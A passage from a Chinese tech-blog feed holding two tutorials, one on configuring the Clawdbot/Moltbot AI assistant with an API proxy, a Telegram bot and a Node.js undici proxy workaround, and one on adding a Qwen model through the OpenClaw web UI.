      <span class="hljs-attr">"anthropic"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"baseUrl"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"https://你的代理地址.com"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"apiKey"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"你的API密钥"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"api"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"anthropic-messages"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"models"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"agents"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"defaults"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"workspace"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"/Users/你的用户名/clawd"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"model"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"primary"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"anthropic/claude-sonnet-4-5-20250929"</span>
      <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"compaction"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"mode"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"safeguard"</span>
      <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"maxConcurrent"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">4</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"channels"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"telegram"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"enabled"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"dmPolicy"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"pairing"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"botToken"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"你的机器人Token"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"groupPolicy"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"allowlist"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"streamMode"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"partial"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"gateway"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"port"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">18789</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"mode"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"local"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"bind"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"loopback"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"auth"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"mode"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"token"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"token"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"你的gateway_token"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h4 data-id="heading-25">6.2 认证配置文件</h4>
<p><code>~/.clawdbot/agents/main/agent/auth-profiles.json</code></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"version"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"profiles"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"anthropic:default"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"api_key"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"provider"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"anthropic"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"apiKey"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"你的API密钥"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<hr/>
<h3 data-id="heading-26">七、常见问题排查</h3>
<h4 data-id="heading-27">7.1 HTTP 403 错误</h4>
<p><strong>可能原因：</strong></p>
<ul>
<li>缺少 <code>api: "anthropic-messages"</code> 配置</li>
<li>缺少 <code>models: []</code> 字段</li>
<li>API 密钥无效或余额不足</li>
</ul>
<p><strong>解决方案：</strong>
检查配置文件格式，确保包含所有必需字段。</p>
<h4 data-id="heading-28">7.2 Telegram 连接失败</h4>
<p><strong>错误信息：</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">TypeError</span>: fetch failed
</code></pre>
<p><strong>可能原因：</strong></p>
<ul>
<li>代理未正确配置</li>
<li>Node.js 的网络请求没有走代理</li>
</ul>
<p><strong>解决方案：</strong>
使用 undici 代理方案（见第三节）。</p>
<h4 data-id="heading-29">7.3 Gateway 启动但无响应</h4>
<p><strong>检查步骤：</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 查看状态</span>
clawdbot status

<span class="hljs-comment"># 查看日志</span>
<span class="hljs-built_in">tail</span> -f /tmp/clawdbot/clawdbot-$(<span class="hljs-built_in">date</span> +%Y-%m-%d).<span class="hljs-built_in">log</span>
</code></pre>
<h4 data-id="heading-30">7.4 配对码不显示</h4>
<p><strong>可能原因：</strong></p>
<ul>
<li>Telegram 机器人 Token 无效</li>
<li>代理连接不稳定</li>
</ul>
<p><strong>解决方案：</strong></p>
<ol>
<li>验证 Token：<code>curl -x http://127.0.0.1:1087 https://api.telegram.org/bot你的TOKEN/getMe</code></li>
<li>检查代理连接是否正常</li>
</ol>
<hr/>
<h3 data-id="heading-31">八、常用命令速查</h3>













































<table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td><code>clawdbot status</code></td><td>查看状态</td></tr><tr><td><code>clawdbot status --deep</code></td><td>查看详细状态</td></tr><tr><td><code>clawdbot models status</code></td><td>查看模型状态</td></tr><tr><td><code>clawdbot logs --follow</code></td><td>实时查看日志</td></tr><tr><td><code>clawdbot gateway restart</code></td><td>重启网关</td></tr><tr><td><code>clawdbot configure</code></td><td>配置向导</td></tr><tr><td><code>clawdbot doctor</code></td><td>诊断问题</td></tr><tr><td><code>clawdbot dashboard</code></td><td>打开控制面板</td></tr><tr><td><code>clawdbot pairing approve telegram &lt;码&gt;</code></td><td>批准配对</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-32">九、总结</h3>
<p>在特殊网络环境下配置 Clawdbot 的主要挑战：</p>
<ol>
<li><strong>代理配置复杂</strong>：Node.js 22 的网络请求不读取环境变量代理，需要使用 undici 方案</li>
<li><strong>配置格式严格</strong>：<code>api</code> 和 <code>models</code> 字段缺一不可，否则会报 403 错误</li>
<li><strong>多个配置文件</strong>：主配置和认证配置需要同时正确设置</li>
</ol>
<p><strong>推荐方案：</strong></p>
<ul>
<li>使用 API 代理服务获取稳定的 API 访问</li>
<li>使用 undici + 启动脚本配置全局代理</li>
<li>保留配置备份，方便出问题时恢复</li>
</ul>
<hr/>
<h3 data-id="heading-33">参考资源</h3>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.molt.bot%2F" target="_blank" title="https://docs.molt.bot/" ref="nofollow noopener noreferrer">Moltbot 官方文档</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fmoltbot%2Fmoltbot" target="_blank" title="https://github.com/moltbot/moltbot" ref="nofollow noopener noreferrer">Moltbot GitHub 仓库</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxianyu110%2Fclawbot" target="_blank" title="https://github.com/xianyu110/clawbot" ref="nofollow noopener noreferrer">配置指南参考</a></li>
</ul>
<hr/>
<h3 data-id="heading-34">文件结构速查</h3>
<pre><code class="hljs language-bash" lang="bash">~/.clawdbot/
├── clawdbot.json                    <span class="hljs-comment"># 主配置</span>
├── logs/                            <span class="hljs-comment"># 日志目录</span>
│   ├── gateway.log
│   └── gateway.err.log
└── agents/
    └── main/
        ├── agent/
        │   └── auth-profiles.json   <span class="hljs-comment"># 认证配置</span>
        └── sessions/                <span class="hljs-comment"># 会话存储</span>

~/
├── proxy-setup.js                   <span class="hljs-comment"># 代理配置脚本</span>
└── start-clawdbot.sh               <span class="hljs-comment"># 启动脚本</span>
</code></pre>
<hr/>
<hr/>
<h3 data-id="heading-35">附录：LLM摘要</h3>
<blockquote>
<p>以下是本文的结构化摘要，方便喂给其他 AI 模型快速理解，节省 token 消耗。</p>
</blockquote>
<p>yaml</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># Clawdbot/Moltbot 配置知识卡片</span>
<span class="hljs-comment"># 生成时间: 2026-01</span>
<span class="hljs-comment"># 用途: 供AI模型快速理解本文核心内容</span>

<span class="hljs-attr">meta:</span>
  <span class="hljs-attr">project:</span> <span class="hljs-string">Clawdbot</span> <span class="hljs-string">(已更名</span> <span class="hljs-string">Moltbot)</span>
  <span class="hljs-attr">repo:</span> <span class="hljs-string">https://github.com/moltbot/moltbot</span>
  <span class="hljs-attr">docs:</span> <span class="hljs-string">https://docs.molt.bot/</span>
  <span class="hljs-string">功能:</span> <span class="hljs-string">本地AI助手，支持Telegram/WhatsApp/Discord接入Claude模型</span>

<span class="hljs-string">环境要求:</span>
  <span class="hljs-attr">os:</span> <span class="hljs-string">macOS/Linux</span>
  <span class="hljs-attr">node:</span> <span class="hljs-string">"&gt;=22.0.0"</span>
  <span class="hljs-string">安装:</span> <span class="hljs-string">npm</span> <span class="hljs-string">install</span> <span class="hljs-string">-g</span> <span class="hljs-string">clawdbot</span>
  <span class="hljs-string">初始化:</span> <span class="hljs-string">clawdbot</span> <span class="hljs-string">onboard</span>

<span class="hljs-string">配置文件:</span>
  <span class="hljs-string">主配置:</span> <span class="hljs-string">~/.clawdbot/clawdbot.json</span>
  <span class="hljs-string">认证配置:</span> <span class="hljs-string">~/.clawdbot/agents/main/agent/auth-profiles.json</span>

<span class="hljs-string">API代理配置:</span>
  <span class="hljs-string">位置:</span> <span class="hljs-string">clawdbot.json</span> <span class="hljs-string">-&gt;</span> <span class="hljs-string">models.providers.anthropic</span>
  <span class="hljs-string">必需字段:</span>
    <span class="hljs-attr">baseUrl:</span> <span class="hljs-string">"API代理地址"</span>
    <span class="hljs-attr">apiKey:</span> <span class="hljs-string">"密钥"</span>
    <span class="hljs-attr">api:</span> <span class="hljs-string">"anthropic-messages"</span>  <span class="hljs-comment"># 关键！缺少报403</span>
    <span class="hljs-attr">models:</span> []  <span class="hljs-comment"># 关键！必须存在，可为空数组</span>
  <span class="hljs-string">示例:</span> <span class="hljs-string">|
    {"models":{"providers":{"anthropic":{
      "baseUrl":"https://proxy.example.com",
      "apiKey":"sk-xxx",
      "api":"anthropic-messages",
      "models":[]
    }}}}
</span>
<span class="hljs-string">认证配置:</span>
  <span class="hljs-string">位置:</span> <span class="hljs-string">auth-profiles.json</span>
  <span class="hljs-string">格式:</span> <span class="hljs-string">|
    {"version":1,"profiles":{"anthropic:default":{
      "type":"api_key","provider":"anthropic","apiKey":"sk-xxx"
    }}}
</span>
<span class="hljs-string">网络代理问题:</span>
  <span class="hljs-string">症状:</span> <span class="hljs-string">Telegram连接失败，fetch</span> <span class="hljs-string">failed</span>
  <span class="hljs-string">原因:</span> <span class="hljs-string">Node.js</span> <span class="hljs-number">22</span> <span class="hljs-string">的</span> <span class="hljs-string">fetch</span> <span class="hljs-string">不读取</span> <span class="hljs-string">HTTP_PROXY</span> <span class="hljs-string">环境变量</span>
  <span class="hljs-string">错误方式:</span> <span class="hljs-string">export</span> <span class="hljs-string">HTTP_PROXY=...</span> <span class="hljs-string">无效</span>
  <span class="hljs-string">正确方案:</span>
    <span class="hljs-string">1_安装:</span> <span class="hljs-string">npm</span> <span class="hljs-string">install</span> <span class="hljs-string">-g</span> <span class="hljs-string">undici</span>
    <span class="hljs-string">2_创建脚本:</span> <span class="hljs-string">|
      # ~/proxy-setup.js
      const {setGlobalDispatcher,ProxyAgent}=require('undici');
      setGlobalDispatcher(new ProxyAgent('http://127.0.0.1:端口'));
</span>    <span class="hljs-string">3_启动命令:</span> <span class="hljs-string">|
      NODE_PATH=$(npm root -g) node --require ~/proxy-setup.js $(which clawdbot) gateway --port 18789
</span>
<span class="hljs-string">Telegram配置:</span>
  <span class="hljs-string">配置位置:</span> <span class="hljs-string">clawdbot.json</span> <span class="hljs-string">-&gt;</span> <span class="hljs-string">channels.telegram</span>
  <span class="hljs-string">必需字段:</span> {<span class="hljs-string">enabled:true</span>, <span class="hljs-string">botToken:"xxx"</span>, <span class="hljs-string">dmPolicy:"pairing"</span>}
  <span class="hljs-string">配对流程:</span>
    <span class="hljs-attr">1:</span> <span class="hljs-string">通过@BotFather创建机器人获取token</span>
    <span class="hljs-attr">2:</span> <span class="hljs-string">配置clawdbot.json</span>
    <span class="hljs-attr">3:</span> <span class="hljs-string">启动gateway</span>
    <span class="hljs-attr">4:</span> <span class="hljs-string">Telegram发消息给bot</span>
    <span class="hljs-attr">5:</span> <span class="hljs-string">获取配对码</span>
    <span class="hljs-attr">6:</span> <span class="hljs-string">执行</span> <span class="hljs-string">clawdbot</span> <span class="hljs-string">pairing</span> <span class="hljs-string">approve</span> <span class="hljs-string">telegram</span> <span class="hljs-string">&lt;配对码&gt;</span>

<span class="hljs-string">Web控制台:</span>
  <span class="hljs-string">地址:</span> <span class="hljs-string">http://127.0.0.1:18789/?token=&lt;gateway_token&gt;</span>
  <span class="hljs-string">命令:</span> <span class="hljs-string">clawdbot</span> <span class="hljs-string">dashboard</span>

<span class="hljs-string">常见错误:</span>
  <span class="hljs-attr">HTTP_403:</span>
    <span class="hljs-string">原因:</span> [<span class="hljs-string">缺少api字段</span>, <span class="hljs-string">缺少models字段</span>, <span class="hljs-string">apiKey无效</span>]
    <span class="hljs-string">解决:</span> <span class="hljs-string">检查配置文件格式</span>
  <span class="hljs-attr">fetch_failed:</span>
    <span class="hljs-string">原因:</span> <span class="hljs-string">代理未生效</span>
    <span class="hljs-string">解决:</span> <span class="hljs-string">使用undici方案</span>
  <span class="hljs-string">配对码不显示:</span>
    <span class="hljs-string">原因:</span> [<span class="hljs-string">botToken无效</span>, <span class="hljs-string">代理不稳定</span>]
    <span class="hljs-string">解决:</span> <span class="hljs-string">curl测试Telegram</span> <span class="hljs-string">API</span>

<span class="hljs-string">命令速查:</span>
  <span class="hljs-string">状态:</span> <span class="hljs-string">clawdbot</span> <span class="hljs-string">status</span> [<span class="hljs-string">--deep</span>]
  <span class="hljs-string">日志:</span> <span class="hljs-string">clawdbot</span> <span class="hljs-string">logs</span> <span class="hljs-string">--follow</span>
  <span class="hljs-string">重启:</span> <span class="hljs-string">clawdbot</span> <span class="hljs-string">gateway</span> <span class="hljs-string">restart</span>
  <span class="hljs-string">诊断:</span> <span class="hljs-string">clawdbot</span> <span class="hljs-string">doctor</span>
  <span class="hljs-string">配对:</span> <span class="hljs-string">clawdbot</span> <span class="hljs-string">pairing</span> <span class="hljs-string">approve</span> <span class="hljs-string">telegram</span> <span class="hljs-string">&lt;码&gt;</span>
  <span class="hljs-string">面板:</span> <span class="hljs-string">clawdbot</span> <span class="hljs-string">dashboard</span>

<span class="hljs-string">文件结构:</span>
  <span class="hljs-string">~/.clawdbot/clawdbot.json:</span> <span class="hljs-string">主配置</span>
  <span class="hljs-string">~/.clawdbot/agents/main/agent/auth-profiles.json:</span> <span class="hljs-string">认证</span>
  <span class="hljs-string">~/proxy-setup.js:</span> <span class="hljs-string">代理脚本</span>
  <span class="hljs-string">~/start-clawdbot.sh:</span> <span class="hljs-string">启动脚本</span>
</code></pre>
<p><strong>使用方法：</strong> 复制上方 YAML 代码块，直接粘贴给 AI 助手，即可快速获得 Clawdbot 配置相关问题的解答。</p>
<hr/>
<p><em>本文基于 2026 年 1 月的实际配置经历撰写， 由claude-opus-4.5 + clawdbot整理编写。</em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[openclaw UI方式配置API]]></title>    <link>https://juejin.cn/post/7600953879500619827</link>    <guid>https://juejin.cn/post/7600953879500619827</guid>    <pubDate>2026-01-30T10:02:29.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600953879500619827" data-draft-id="7600967006893113353" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="openclaw UI方式配置API"/> <meta itemprop="keywords" content="人工智能"/> <meta itemprop="datePublished" content="2026-01-30T10:02:29.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="luka1012"/> <meta itemprop="url" content="https://juejin.cn/user/4311612244630649"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            openclaw UI方式配置API
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4311612244630649/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    luka1012
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T10:02:29.000Z" title="Fri Jan 30 2026 10:02:29 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在执行 openclaw dashborad 指令后打开带有token的url链接，进到如下页面</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c9c398380efc4c47863470b9e5f10fd9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbHVrYTEwMTI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770372148&amp;x-signature=NQj4%2Bqbgz8TH5BPw1N9GsjvN5dE%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-0">添加模型  (这里以通义千问 Max Thinking 版举例)</h3>
<p>右侧config --&gt;models --&gt; provider, 点击add entry</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cf0ffc6c302d4b39a261f6b54eefa8ac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbHVrYTEwMTI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770372148&amp;x-signature=K%2FNbg0XlQgVqde737e%2FuCQhQk70%3D" alt="image.png" loading="lazy"/></p>
<p>表格中内容填写按照如下格式：</p>
<pre><code class="hljs language-json" lang="json">providers<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      bailian<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        baseUrl<span class="hljs-punctuation">:</span> <span class="hljs-string">"https://dashscope.aliyuncs.com/compatible-mode/v1"</span><span class="hljs-punctuation">,</span>
        apiKey<span class="hljs-punctuation">:</span> <span class="hljs-string">"替换为你的API key"</span><span class="hljs-punctuation">,</span>
        api<span class="hljs-punctuation">:</span> <span class="hljs-string">"openai-completions"</span><span class="hljs-punctuation">,</span>
        models<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
          <span class="hljs-punctuation">{</span>
            id<span class="hljs-punctuation">:</span> <span class="hljs-string">"qwen3-max-2026-01-23"</span><span class="hljs-punctuation">,</span>
            name<span class="hljs-punctuation">:</span> <span class="hljs-string">"通义千问 Max Thinking 版"</span><span class="hljs-punctuation">,</span>
            reasoning<span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span>
            input<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"text"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
            cost<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> input<span class="hljs-punctuation">:</span> <span class="hljs-number">0.0025</span><span class="hljs-punctuation">,</span> output<span class="hljs-punctuation">:</span> <span class="hljs-number">0.01</span><span class="hljs-punctuation">,</span> cacheRead<span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span> cacheWrite<span class="hljs-punctuation">:</span> <span class="hljs-number">0</span> <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
            contextWindow<span class="hljs-punctuation">:</span> <span class="hljs-number">262144</span><span class="hljs-punctuation">,</span>
            maxTokens<span class="hljs-punctuation">:</span> <span class="hljs-number">65536</span>
          <span class="hljs-punctuation">}</span>
        <span class="hljs-punctuation">]</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-1">应用模型</h3>
<p>将添加的模型设为默认：
config --&gt; agents --&gt;Default --&gt;Model
按照以下格式填写内容</p>
<p>（1. 在models里添加entry</p>
<ol start="2">
<li>将primary model 字段改为bailian/qwen3-max-2026-01-23）</li>
</ol>
<pre><code class="hljs language-json" lang="json">agents<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    defaults<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      model<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> primary<span class="hljs-punctuation">:</span> <span class="hljs-string">"bailian/qwen3-max-2026-01-23"</span> <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
      models<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"bailian/qwen3-max-2026-01-23"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> alias<span class="hljs-punctuation">:</span> <span class="hljs-string">"通义千问 Max Thinking 版"</span> <span class="hljs-punctuation">}</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">}</span>
</code></pre>
<p>如图</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1529e93bc0c04da28b56bca1819cf583~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbHVrYTEwMTI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770372148&amp;x-signature=7MaFUTCBq0dG0OSC%2BbXof57VzNo%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3dd5c89b28aa4c6da7d1db7db1e6a8a1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbHVrYTEwMTI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770372148&amp;x-signature=BUdOL3DGGc1XRS%2BVtsGQ66GVtGU%3D" alt="image.png" loading="lazy"/></p>
<p><strong>点击save 保存配置</strong></p>
